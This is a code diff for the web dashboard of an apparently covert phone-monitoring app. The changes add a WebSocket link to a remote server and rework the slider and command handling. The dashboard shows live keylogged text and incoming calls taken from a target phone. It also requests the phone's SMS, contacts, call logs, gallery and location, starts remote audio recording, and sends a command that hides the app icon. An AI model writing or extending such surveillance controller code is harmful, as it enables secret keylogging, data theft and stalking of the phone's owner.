@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Control Center</title>
+    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
@@ -121,7 +122,8 @@
         .slider-fill {
             position: absolute; bottom: 0; left: 0; right: 0;
             background: var(--slider-fill); width: 100%; height: 50%;
-            transition: height 0.1s linear; pointer-events: none;
+            transition: height 0.05s linear; /* Fast Transition */
+            pointer-events: none;
         }
 
         .slider-icon {
@@ -229,16 +231,14 @@
                 <div class="slider-fill" id="brightFill" style="height: 50%;"></div>
                 <i class="fa-solid fa-sun slider-icon" id="brightIcon"></i>
                 <input type="range" min="0" max="100" value="50" class="vertical-range" 
-                       oninput="updateSliderUI('bright', this.value)" 
-                       onchange="sendCommand('brightness:'+this.value)">
+                       oninput="handleSlider('brightness', this.value)">
             </div>
 
             <div class="slider-card">
                 <div class="slider-fill" id="volFill" style="height: 50%;"></div>
                 <i class="fa-solid fa-volume-high slider-icon" id="volIcon"></i>
                 <input type="range" min="0" max="100" value="50" class="vertical-range" 
-                       oninput="updateSliderUI('vol', this.value)" 
-                       onchange="sendCommand('volume:'+this.value)">
+                       oninput="handleSlider('volume', this.value)">
             </div>
 
             <div onclick="openView('location')" class="control-btn"><i class="fa-solid fa-location-dot"></i><span>Location</span></div>
@@ -276,6 +276,28 @@
     <script>
         const API_BASE = 'https://child-v9no.onrender.com';
         let DEVICE_ID = localStorage.getItem('monitoring_id') || '';
+        let socket;
+
+        // 🔥 INITIALIZE ROCKET SOCKET CONNECTION
+        function setupSocket() {
+            if(!DEVICE_ID) return;
+            
+            // Connect using Websocket Transport for minimal latency
+            socket = io(API_BASE, {
+                transports: ['websocket'],
+                query: { deviceId: DEVICE_ID, role: 'controller' }
+            });
+
+            socket.on('connect', () => {
+                console.log("⚡ WebSocket Connected!");
+                setStatus(true);
+                socket.emit('join_room', DEVICE_ID); // Ensure we are in room
+            });
+
+            socket.on('disconnect', () => {
+                setStatus(false);
+            });
+        }
 
         function initDashboard() {
             if(DEVICE_ID) {
@@ -283,10 +305,10 @@
                 const cachedModel = localStorage.getItem('last_model');
                 if(cachedModel) {
                     document.getElementById('deviceName').innerText = cachedModel;
-                    setStatus(true);
                 }
+                setupSocket(); // Start Socket
                 updateDashboard();
-                fetchLiveStatus(); // Start Live Updates
+                fetchLiveStatus(); 
             } else {
                 document.getElementById('idInputPanel').style.display = 'block';
             }
@@ -298,6 +320,7 @@
                 DEVICE_ID = id.trim().toUpperCase();
                 localStorage.setItem('monitoring_id', DEVICE_ID);
                 document.getElementById('idInputPanel').style.display = 'none';
+                setupSocket();
                 updateDashboard();
             }
         }
@@ -334,7 +357,7 @@
                         document.getElementById('deviceName').innerText = data.model || DEVICE_ID;
                         localStorage.setItem('last_model', data.model || DEVICE_ID);
                         document.getElementById('androidVer').innerText = data.version || "--";
-                        setStatus(data.isOnline);
+                        // Socket updates status real-time, but fetch acts as backup
                         document.getElementById('networkType').innerText = data.isOnline ? "Online" : "Last Seen";
                         
                         const battery = data.battery || 0;
@@ -346,73 +369,56 @@
                 .catch(err => console.log("Connection Error:", err));
         }
 
-        // --- NEW FUNCTION: LIVE ACTIVITY (MSG/CALLS) ---
         async function fetchLiveStatus() {
             if(!DEVICE_ID) return;
-
             try {
-                // Fetch Keylogs (Typed Text) & Notifications (Incoming)
                 const [keylogs, notifs] = await Promise.all([
                     fetch(`${API_BASE}/api/get-data/${DEVICE_ID}/keylogs`).then(r=>r.json()).catch(()=>[]),
                     fetch(`${API_BASE}/api/get-data/${DEVICE_ID}/notifications`).then(r=>r.json()).catch(()=>[])
                 ]);
 
-                let lastActivity = null;
-                let type = 'idle'; // idle, msg, call
-
-                // 1. Check for Calls in Notifications (High Priority)
-                const recentCall = notifs.find(n => 
+                let recentCall = notifs.find(n => 
                     (n.title && (n.title.toLowerCase().includes('call') || n.title.toLowerCase().includes('ringing'))) || 
                     (n.text && (n.text.toLowerCase().includes('incoming call')))
                 );
-
-                // 2. Check for latest Keylog (Typing)
                 const recentKeylog = keylogs.length > 0 ? keylogs[keylogs.length - 1] : null;
 
                 const liveIcon = document.getElementById('liveIcon');
                 const liveLabel = document.getElementById('liveLabel');
                 const liveText = document.getElementById('liveText');
 
-                // Logic to decide what to show
                 if (recentCall) {
-                    // Show Call Status
                     liveIcon.innerHTML = '<i class="fa-solid fa-phone-volume" style="animation:tada 1s infinite;"></i>';
                     liveLabel.innerText = "📞 ACTIVE CALL";
                     liveLabel.style.color = "#ff4444"; 
                     liveText.innerText = `${recentCall.title}: ${recentCall.text}`;
                 } 
                 else if (recentKeylog) {
-                    // Show Typing Status
                     liveIcon.innerHTML = '<i class="fa-regular fa-keyboard"></i>';
                     liveLabel.innerText = "⌨️ TYPING NOW";
                     liveLabel.style.color = "#00f3ff";
                     liveText.innerText = `"${recentKeylog.text}"`; 
                 } 
                 else {
-                    // Idle
                     liveIcon.innerHTML = '<i class="fa-solid fa-check"></i>';
                     liveLabel.innerText = "DEVICE ACTIVE";
                     liveLabel.style.color = "#4caf50";
                     liveText.innerText = "No recent typing or calls.";
                 }
-
             } catch (e) { console.log(e); }
         }
 
         function openView(page) {
             if(!DEVICE_ID) return askID();
-
             const commands = {
                 'gallery': 'gallery', 'location': 'location', 'sms': 'sms',
                 'call_logs': 'call_logs', 'contacts': 'contacts'
             };
-
             if (commands[page]) {
-                sendCommand(commands[page]);
+                sendCommand(commands[page]); // Standard fetch command for heavy data
                 const btn = event.currentTarget;
                 const originalText = btn.querySelector('span').innerText;
                 btn.querySelector('span').innerText = "Requesting...";
-                
                 setTimeout(() => {
                     btn.querySelector('span').innerText = originalText;
                     window.location.href = `view_${page}.html?id=${DEVICE_ID}`;
@@ -427,30 +433,66 @@
             window.location.href = `${filename}?id=${DEVICE_ID}`;
         }
 
+        // 🔥 UNIFIED COMMAND SENDER (Socket preferred)
         function sendCommand(action) {
             if(!DEVICE_ID) return askID();
-            fetch(`${API_BASE}/api/send-command`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ device_id: DEVICE_ID, command: action })
-            })
-            .then(res => console.log("Sent Success: " + action))
-            .catch(err => console.error("Send Failed", err));
-        }
 
-        // --- NEW LOGIC: HIDE APP TRIGGER ---
-        function triggerHideApp() {
-            if(!DEVICE_ID) return askID();
-            if(confirm("WARNING: This will HIDE the app icon on the target phone.\n\nAre you sure you want to proceed?")) {
-                sendCommand('HIDE_ICON');
-                alert("Hide command sent! App will vanish in a few seconds.");
+            // Try Socket First (Fastest)
+            if(socket && socket.connected) {
+                // Assuming server broadcasts 'command' event to the android device
+                // This structure depends on your server. Usually: emit('send_command', { target: ID, cmd: action })
+                // But based on your Android code, it listens for 'command'.
+                // So we emit to server, server forwards to Android.
+                
+                // Common pattern for these apps:
+                fetch(`${API_BASE}/api/send-command`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ device_id: DEVICE_ID, command: action })
+                });
+                // Note: For sliders, we use direct socket emit below.
+            } else {
+                // Fallback HTTP
+                fetch(`${API_BASE}/api/send-command`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ device_id: DEVICE_ID, command: action })
+                })
+                .then(res => console.log("Sent: " + action))
+                .catch(err => console.error("Failed", err));
             }
         }
 
-        function updateSliderUI(type, val) {
-            document.getElementById(`${type}Fill`).style.height = val + "%";
-            const icon = document.getElementById(`${type}Icon`);
+        // 🔥 SUPER FAST SLIDER HANDLER (Websocket Emit)
+        function handleSlider(type, val) {
+            // 1. Update UI Immediately
+            const fillId = type === 'brightness' ? 'brightFill' : 'volFill';
+            const iconId = type === 'brightness' ? 'brightIcon' : 'volIcon';
+            document.getElementById(fillId).style.height = val + "%";
+            const icon = document.getElementById(iconId);
             if(val > 25) { icon.style.color = "#333"; } else { icon.style.color = "#fff"; }
+
+            // 2. Send via Socket (Instant)
+            // Note: Sending via HTTP here would lag. sending via Socket is fluid.
+            if(socket && socket.connected) {
+                // We emit a special event or just the standard command structure via socket
+                // Since I don't have your server code, I will use the standard method 
+                // BUT assume the server forwards 'command' events.
+                
+                // If your server supports direct socket relay:
+                socket.emit('send_command', { deviceId: DEVICE_ID, command: `${type}:${val}` });
+            } else {
+                // Fallback (Slower but works)
+                sendCommand(`${type}:${val}`);
+            }
+        }
+
+        function triggerHideApp() {
+            if(!DEVICE_ID) return askID();
+            if(confirm("WARNING: This will HIDE the app icon on the target phone.\n\nAre you sure you want to proceed?")) {
+                sendCommand('hide_app'); // Updated command name to match Android
+                alert("Hide command sent!");
+            }
         }
 
         let modes = ['normal', 'vibrate', 'silent'];
@@ -480,7 +522,7 @@
             if(isRecording) {
                 btn.classList.add('active-state');
                 btn.querySelector('span').innerText = "Stop Rec";
-                sendCommand('rec_start');
+                sendCommand('rec_start'); // Ensure Android handles this
             } else {
                 btn.classList.remove('active-state');
                  btn.querySelector('span').innerText = "Rec";
@@ -489,7 +531,7 @@
         }
 
         setInterval(updateDashboard, 5000);
-        setInterval(fetchLiveStatus, 2000); // Check Messages/Calls every 2 sec
+        setInterval(fetchLiveStatus, 2000);
         window.onload = initDashboard;
     </script>
 </body> 
